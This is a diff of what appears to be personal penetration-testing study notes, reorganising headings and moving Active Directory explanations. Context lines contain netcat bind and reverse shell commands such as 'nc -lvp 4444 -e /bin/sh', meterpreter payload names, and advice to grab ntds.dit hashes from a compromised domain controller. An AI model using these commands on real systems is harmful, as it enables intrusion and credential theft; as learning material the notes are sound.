@@ -314,7 +314,7 @@ I try as much as possible to link to the various sources or inspiration for thes
 - [Session hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
 - [Session fixation](https://owasp.org/www-community/attacks/Session_fixation)
 
-Shells
+**Shells**
 - Shell: we open a shell on the client
 - Reverse shell: we make the victim connect to us with a shell
   - Attacker: `nc -lvp 4444`
@@ -323,11 +323,20 @@ Shells
   - Attacker: `nc <ip_victim> 4444`
   - Victim: `nc -lvp 4444 -e /bin/sh`
 
-Payloads
+**Payloads**
 - Staged: Sends payload in stages, can be less stable
   - example: `windows/meterpreter/reverse_tcp`
 - Non-staged: Sends exploit all at once, larger in size and won't always work
   - example: `windows/meterpreter_reverse_tcp`
+
+**Active directory**
+There can be multiple domains. This is called a tree, a parent domain and other child domains. With many trees you start to have a forest. Inside are the Organization Unites, objects.
+
+Trust:
+- Directional: one domain trust one domain
+- Transactional: one domain trusts one domain and everything that it trusts
+
+SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.
 
 ### <ins>Client-specific key areas of concern</ins>
 - [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/laws-regulations/index.html), a framework that governs medical data in the US
@@ -5628,18 +5637,10 @@ Example of usage
 | Windows Server 2008 or later | NTLM and SHA-1 |
 | - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |
 
-There can be multiple domains. This is called a tree, a parent domain and other child domains. With many trees you start to have a forest. Inside are the Organization Unites, objects.
-
-Trust:
-- Directional: one domain trust one domain
-- Transactional: one domain trusts one domain and everything that it trusts
-
 When you compromise a Domain Controller, you want to be able to get the ntds.dit file
 - Contains password hashes
 - ticket attack, pass the hash attack, crack the password etc
 - generally stored in %SystemRoot%\NTDS
-
-SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.
 
 
 **Misc notes**
